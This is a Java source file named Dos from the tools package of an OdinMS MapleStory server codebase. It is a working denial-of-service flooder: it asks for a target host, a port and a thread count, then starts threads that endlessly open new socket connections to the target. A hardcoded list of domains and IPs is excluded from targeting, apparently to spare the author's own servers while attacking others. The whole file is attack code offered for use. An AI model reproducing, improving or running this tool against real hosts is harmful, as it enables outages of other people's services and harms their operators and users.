/*
This file is part of the OdinMS Maple Story Server
Copyright (C) 2008 ~ 2010 Patrick Huy <patrick.huy@frz.cc> 
Matthias Butz <matze@odinms.de>
Jan Christian Meyer <vimes@odinms.de>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License version 3
as published by the Free Software Foundation. You may not use, modify
or distribute this program under any other version of the
GNU Affero General Public License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package tools;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.ConnectException;
import java.net.UnknownHostException;

public class Dos extends Socket implements Runnable {

    private static Dos instance = new Dos();
    public static String target = "";
    public static int port = 80;
    public static int count = 0;
    private static final String tosend = "";

    public static void main(String args[]) {

        System.out.println("Please input the IP/Domain of the target you would like to ddos :::");
        int retry1 = 0;
        while (retry1 == 0) {
            try {
                target = System.console().readLine();
                if (target.contains("kryptodev") || target.contains("destinyms") || target.contains("89.18.189.189") || target.contains("91.214.44.30") || target.contains("69.163.44.74") || target.contains("smexy.myftp.org")) {
                    retry1 = 0;
                    System.out.println("Invalid input. Please re-enter.");
                } else {
                    retry1 = 1;
                }
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Please input the port of the target you would like to ddos [Default = 80");
        int retry2 = 0;
        while (retry2 == 0) {
            try {
                port = Integer.parseInt(System.console().readLine());
                retry2 = 1;
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Please input the number of instance you would like to create :::");
        int retry3 = 0;
        int times = 0;
        while (retry3 == 0) {
            try {
                times = Integer.parseInt(System.console().readLine());
                retry3 = 1;
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Starting instances.");
        for (int i = 0; i < times; i++) {
            new Thread(instance).start();
            count++;
            System.out.println("Instance #" + i + " started.");
        }
    }

    public void run() {
        while (true) {
            try {
//		sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
//		sendRawLine("Host: " + target, net); // Sends Host: to the OutputStream
                final BufferedWriter out = new BufferedWriter(new OutputStreamWriter(new Socket(target, port).getOutputStream()));
                out.write(tosend);
                out.flush();
            } catch (ConnectException ce) {
                System.out.println("Connection exception occured, retrying.");
            } catch (UnknownHostException e) {
                System.out.println("DDoS.run: " + e);
            } catch (IOException e) {
                System.out.println("DDoS.run: " + e);
            }
        }
    }
}
